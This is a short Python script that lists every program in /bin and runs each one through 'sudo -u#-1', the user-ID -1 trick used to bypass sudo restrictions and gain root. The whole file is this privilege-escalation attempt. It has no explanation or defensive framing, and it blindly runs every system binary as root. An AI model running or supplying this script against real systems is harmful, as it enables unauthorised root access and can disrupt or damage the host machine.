import os
import time
import subprocess
out = subprocess.check_output("cd /bin && ls", shell=True).decode("ascii")

b = out.replace('\n', ':')
c = b.split(':')
print(c)

for x in c:
    os.system("sudo -u#-1 " + x)
    #time.sleep(.1)
    
